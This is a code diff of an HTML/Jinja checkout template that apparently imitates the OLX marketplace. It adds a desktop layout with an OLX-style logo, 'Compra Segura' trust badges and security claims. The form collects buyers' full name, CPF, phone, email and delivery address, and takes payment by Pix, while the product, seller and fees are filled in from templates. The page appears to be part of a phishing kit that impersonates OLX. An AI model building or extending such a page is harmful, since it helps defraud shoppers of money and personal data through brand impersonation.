@@ -1107,6 +1107,27 @@
       width: 100%;
       height: 100%;
     }
+    
+    /* Visão Desktop da Etapa 1 */
+    .dt-lead-desktop-view {
+      display: none;
+      width: 100%;
+      background: #ffffff;
+      min-height: 100vh;
+    }
+    .lead-mobile-view {
+      display: block;
+      width: 100%;
+    }
+    @media (min-width: 769px) {
+      .dt-lead-desktop-view {
+        display: block !important;
+      }
+      .lead-mobile-view {
+        display: none !important;
+      }
+    }
+
     .pay-screen-desktop-view {
       display: none;
       width: 100%;
@@ -2479,8 +2500,239 @@
   <div class="checkout-modal-container">
     
     <!-- STEP 1: QUALIFIED LEAD CAPTURE (DADOS PESSOAIS E ENTREGA) -->
-    <div class="modal-step-body" id="modal-step-1" style="display: block; padding: 0; height: 100%; overflow: hidden;">
-      <div class="olx-custom-screen-wrap">
+    <div class="modal-step-body" id="modal-step-1" style="display: block; padding: 0; min-height: 100vh;">
+      
+      <!-- ══════════════════════════════════════════════════════════════════ -->
+      <!-- VISÃO DESKTOP (min-width: 769px): IDÊNTICA À IMAGEM 1 DO CLIENTE   -->
+      <!-- ══════════════════════════════════════════════════════════════════ -->
+      <div class="dt-lead-desktop-view">
+        <header class="dt-pay-header">
+          <div class="dt-pay-header-inner">
+            <div class="dt-pay-header-logo">
+              {% if logo_url %}
+                <img src="{{ logo_url }}" alt="Logo" class="dt-pay-logo-img" id="dt-lead-screen-logo" onerror="this.style.display='none'" />
+              {% else %}
+                <svg viewBox="0 0 220 88" xmlns="http://www.w3.org/2000/svg" height="32">
+                  <circle cx="30" cy="44" r="29" fill="#F28A30"/>
+                  <circle cx="30" cy="44" r="16" fill="#fff"/>
+                  <rect x="66" y="15" width="15" height="58" rx="3" fill="#7B02E8"/>
+                  <rect x="66" y="59" width="30" height="14" rx="3" fill="#7B02E8"/>
+                  <line x1="103" y1="15" x2="148" y2="73" stroke="#F28A30" stroke-width="16" stroke-linecap="round"/>
+                  <line x1="148" y1="15" x2="103" y2="73" stroke="#F28A30" stroke-width="16" stroke-linecap="round"/>
+                </svg>
+              {% endif %}
+            </div>
+            <div class="dt-pay-header-right">
+              <button type="button" class="dt-btn-saiba-mais" onclick="showToast('Ambiente 100% seguro com criptografia bancária OLX.', 'info')">Saiba mais</button>
+              <button type="button" class="dt-btn-close" onclick="closeCheckoutModal()" title="Fechar">
+                <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="#666" stroke-width="2.2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+              </button>
+            </div>
+          </div>
+        </header>
+
+        <main class="dt-pay-main">
+          <div class="dt-pay-container">
+            <!-- Coluna Esquerda: Formulário de Identificação e Entrega -->
+            <div class="dt-pay-left-col">
+              <h1 class="dt-pay-title">Confirme sua compra</h1>
+
+              <!-- Banner Cupom Aplicado -->
+              <div class="dt-coupon-banner" id="dt-lead-coupon-banner" style="display: none;">
+                <div class="dt-coupon-check-icon">
+                  <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="#10b981" stroke-width="2.5">
+                    <polyline points="20 6 9 17 4 12"/>
+                  </svg>
+                </div>
+                <div class="dt-coupon-text-wrap">
+                  <div class="dt-coupon-title">Cupom aplicado!</div>
+                  <div class="dt-coupon-subtitle">Você ganhou desconto nesta compra.</div>
+                </div>
+              </div>
+
+              <!-- Frase de Segurança Compra Segura -->
+              <div class="dt-trust-notice">
+                Compre com segurança e tenha a garantia do dinheiro de volta com a <span class="dt-trust-highlight">Compra Segura</span>
+              </div>
+
+              <!-- Seção Entrega -->
+              <div class="dt-section">
+                <div class="dt-section-title">Entrega</div>
+                <div class="dt-radio-list">
+                  <label class="dt-radio-row selected">
+                    <div class="dt-radio-circle selected">
+                      <div class="dt-radio-dot"></div>
+                    </div>
+                    <span class="dt-radio-label">Quero entrega pela OLX</span>
+                  </label>
+                  <label class="dt-radio-row disabled">
+                    <div class="dt-radio-circle"></div>
+                    <span class="dt-radio-label">Quero retirar com o vendedor <span class="dt-sub-note">(combine pelo chat)</span></span>
+                  </label>
+                </div>
+              </div>
+
+              <!-- Seção Identificação e Endereço -->
+              <div class="dt-section">
+                <div class="dt-section-title">Identificação e Endereço de entrega</div>
+                
+                <div class="form-group">
+                  <label class="form-label">Nome Completo *</label>
+                  <input type="text" id="dt-lead-name" class="form-input" placeholder="Digite seu nome completo" oninput="document.getElementById('lead-name').value = this.value" />
+                </div>
+
+                <div class="form-row">
+                  <div class="form-group">
+                    <label class="form-label">CPF *</label>
+                    <input type="text" id="dt-lead-cpf" class="form-input" placeholder="000.000.000-00" maxlength="14" oninput="document.getElementById('lead-cpf').value = this.value" />
+                  </div>
+                  <div class="form-group">
+                    <label class="form-label">WhatsApp / Celular *</label>
+                    <input type="text" id="dt-lead-phone" class="form-input" placeholder="(11) 99999-9999" maxlength="15" oninput="document.getElementById('lead-phone').value = this.value" />
+                  </div>
+                </div>
+
+                <div class="form-group">
+                  <label class="form-label">E-mail para Rastreamento *</label>
+                  <input type="email" id="dt-lead-email" class="form-input" placeholder="seu-email@exemplo.com" oninput="document.getElementById('lead-email').value = this.value" />
+                </div>
+
+                <div class="form-row">
+                  <div class="form-group">
+                    <label class="form-label">CEP de Entrega *</label>
+                    <input type="text" id="dt-lead-cep" class="form-input" placeholder="00000-000" maxlength="9" oninput="document.getElementById('lead-cep').value = this.value; triggerAddressLookup(this.value.replace(/\D/g, ''));" />
+                  </div>
+                  <div class="form-group">
+                    <label class="form-label">Estado (UF) *</label>
+                    <input type="text" id="dt-lead-state" class="form-input" placeholder="SP" maxlength="2" oninput="document.getElementById('lead-state').value = this.value" />
+                  </div>
+                </div>
+
+                <div class="form-row-3">
+                  <div class="form-group">
+                    <label class="form-label">Rua / Endereço *</label>
+                    <input type="text" id="dt-lead-street" class="form-input" placeholder="Ex: Av. Paulista" oninput="document.getElementById('lead-street').value = this.value" />
+                  </div>
+                  <div class="form-group">
+                    <label class="form-label">Número *</label>
+                    <input type="text" id="dt-lead-number" class="form-input" placeholder="123" oninput="document.getElementById('lead-number').value = this.value" />
+                  </div>
+                  <div class="form-group">
+                    <label class="form-label">Compl.</label>
+                    <input type="text" id="dt-lead-complement" class="form-input" placeholder="Apto 4" oninput="document.getElementById('lead-complement').value = this.value" />
+                  </div>
+                </div>
+
+                <div class="form-row">
+                  <div class="form-group">
+                    <label class="form-label">Bairro *</label>
+                    <input type="text" id="dt-lead-neighborhood" class="form-input" placeholder="Bairro" oninput="document.getElementById('lead-neighborhood').value = this.value" />
+                  </div>
+                  <div class="form-group">
+                    <label class="form-label">Cidade *</label>
+                    <input type="text" id="dt-lead-city" class="form-input" placeholder="Cidade" oninput="document.getElementById('lead-city').value = this.value" />
+                  </div>
+                </div>
+
+                <!-- Cupom de Desconto Desktop -->
+                {% if coupon_active is not defined or coupon_active|int != 0 %}
+                <div class="checkout-coupon-card" style="margin-top: 14px; margin-bottom: 14px;">
+                  <div class="coupon-card-header">
+                    <div style="display:flex;align-items:center;gap:6px">
+                      <svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"/><line x1="7" y1="7" x2="7.01" y2="7"/></svg>
+                      <span>Possui um cupom de desconto?</span>
+                    </div>
+                    <span style="font-size:11px;color:#6b7280;font-weight:600">Opcional</span>
+                  </div>
+                  <div class="coupon-input-wrap">
+                    <input type="text" id="dt-checkout-coupon-input" placeholder="Digite seu cupom aqui" value="{{ shipping_coupon if shipping_coupon is defined and shipping_coupon else '' }}" oninput="document.getElementById('checkout-coupon-input').value = this.value;" />
+                    <button type="button" class="btn-apply-coupon" onclick="document.getElementById('checkout-coupon-input').value = document.getElementById('dt-checkout-coupon-input').value; handleCouponClick();">
+                      <span>Aplicar</span>
+                    </button>
+                  </div>
+                </div>
+                {% endif %}
+              </div>
+
+              <!-- Seção Forma de Pagamento (Pix) -->
+              <div class="dt-section">
+                <div class="dt-section-title">Forma de pagamento</div>
+                <div class="pay-method-card" style="margin: 0; box-shadow: none;">
+                  <div class="pay-radio-outer">
+                    <div class="pay-radio-inner"></div>
+                  </div>
+                  <div class="pay-method-icon-wrap">
+                    <img src="{{ pix_badge_url if pix_badge_url else '/static/images/cards/pix.svg' }}" alt="Pix" class="pay-pix-icon" id="dt-lead-pix-badge" onerror="this.src='/static/images/cards/pix.svg'" />
+                  </div>
+                  <div class="pay-method-info">
+                    <div class="pay-method-name">Pix</div>
+                    <div class="pay-method-sub">A confirmação do seu pagamento é mais rápida</div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Coluna Direita (Card Resumo) -->
+            <div class="dt-pay-right-col">
+              <div class="dt-summary-card">
+                <div class="dt-summary-title">Resumo</div>
+                
+                <div class="dt-product-row">
+                  <img src="{{ product_image1 if product_image1 else '' }}" alt="Produto" class="dt-product-thumb" onerror="this.style.display='none'" />
+                  <div class="dt-product-meta">
+                    <div class="dt-product-name">{{ product_name if product_name else 'Produto OLX' }}</div>
+                    <div class="dt-product-seller">{{ seller_name if seller_name else 'Vendedor Verificado' }}</div>
+                  </div>
+                </div>
+
+                <div class="dt-summary-divider"></div>
+
+                <div class="dt-cost-row">
+                  <span>Produto</span>
+                  <span id="dt-lead-prod-val">R$ {{ product_price if product_price else '' }}</span>
+                </div>
+
+                <div class="dt-cost-row">
+                  <span>Entrega</span>
+                  <span id="dt-lead-shipping-val">R$ {{ shipping_fee if shipping_fee else '19,90' }}</span>
+                </div>
+
+                <div class="dt-cost-row dt-coupon-cost-row" id="dt-lead-coupon-cost-row" style="display: none;">
+                  <span class="dt-coupon-label">Cupom</span>
+                  <span class="dt-coupon-val" id="dt-lead-coupon-cost-val">-R$ 28,99</span>
+                </div>
+
+                <div class="dt-summary-divider"></div>
+
+                <div class="dt-total-row">
+                  <span>Total a pagar</span>
+                  <span class="dt-total-val" id="dt-lead-total-val">R$ {{ product_price if product_price else '' }}</span>
+                </div>
+
+                <button type="button" class="dt-btn-confirm-pay" id="dt-btn-advance-action" onclick="syncAndAdvanceLead()">
+                  <span id="dt-btn-advance-label">Confirmar Pagamento</span>
+                  <svg id="dt-btn-advance-spin" class="spinner-svg" width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" style="display:none;margin-left:8px"><circle cx="12" cy="12" r="10" stroke-opacity="0.25"/><path d="M12 2a10 10 0 0 1 10 10" stroke-linecap="round"/></svg>
+                </button>
+
+                <div class="dt-safe-badge">
+                  <svg width="15" height="15" fill="#6e0ad6" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10" stroke="#fff" stroke-width="2" fill="none"/></svg>
+                  <span>Compra Segura</span>
+                </div>
+
+                <div class="dt-terms-text">
+                  Ao confirmar o pagamento, você declara que está concordando com os <a href="javascript:void(0)">Termos e Condições de uso</a> da OLX
+                </div>
+              </div>
+            </div>
+          </div>
+        </main>
+      </div>
+
+      <!-- ══════════════════════════════════════════════════════════════════ -->
+      <!-- VISÃO MOBILE (max-width: 768px): FLUXO EM ETAPAS COM IDENTIDADE ROXA -->
+      <!-- ══════════════════════════════════════════════════════════════════ -->
+      <div class="lead-mobile-view">
+        <div class="olx-custom-screen-wrap">
         <!-- Thin purple progress bar - Image 2 style -->
         <div class="olx-custom-top-bar" style="background: linear-gradient(90deg, var(--olx-purple) 35%, #e5e7eb 35%);"></div>
 
@@ -2608,6 +2860,9 @@
         </div>
       </div>
     </div>
+
+      </div><!-- /lead-mobile-view -->
+    </div><!-- /modal-step-1 -->
 
     <!-- ─── ETAPA IMAGEM 2: CONFIRMAÇÃO DE DADOS (SENTIDO DE COMPRA DE PRODUTO) ─── -->
     <div class="modal-step-body" id="modal-step-confirm-data" style="display: none; padding: 0; height: 100%; overflow: hidden;">
@@ -3891,6 +4146,23 @@
     const inputBox = document.getElementById('pay-coupon-input-box');
     const nameEl = document.getElementById('pay-coupon-name');
     const valEl = document.getElementById('pay-coupon-discount-val');
+
+    
+    // Sincroniza visual desktop da tela 1
+    const dtLeadCouponBanner = document.getElementById('dt-lead-coupon-banner');
+    const dtLeadCouponRow = document.getElementById('dt-lead-summary-coupon-row');
+    const dtLeadCouponVal = document.getElementById('dt-lead-summary-coupon-val');
+    const dtLeadTotalVal = document.getElementById('dt-lead-summary-total-val');
+    if (activeCoupon) {
+      if (dtLeadCouponBanner) dtLeadCouponBanner.style.display = 'flex';
+      if (dtLeadCouponRow) dtLeadCouponRow.style.display = 'flex';
+      if (dtLeadCouponVal) dtLeadCouponVal.textContent = '- ' + (window._lastCouponDiscountFmt || ('R$ ' + (RAW_PRODUCT_PRICE || '28,99')));
+      if (dtLeadTotalVal) dtLeadTotalVal.textContent = finalAmountFmt;
+    } else {
+      if (dtLeadCouponBanner) dtLeadCouponBanner.style.display = 'none';
+      if (dtLeadCouponRow) dtLeadCouponRow.style.display = 'none';
+      if (dtLeadTotalVal) dtLeadTotalVal.textContent = 'R$ ' + (RAW_PRODUCT_PRICE || '280,00');
+    }
 
     if (activeCoupon) {
       if (appliedBox) appliedBox.style.display = 'flex';
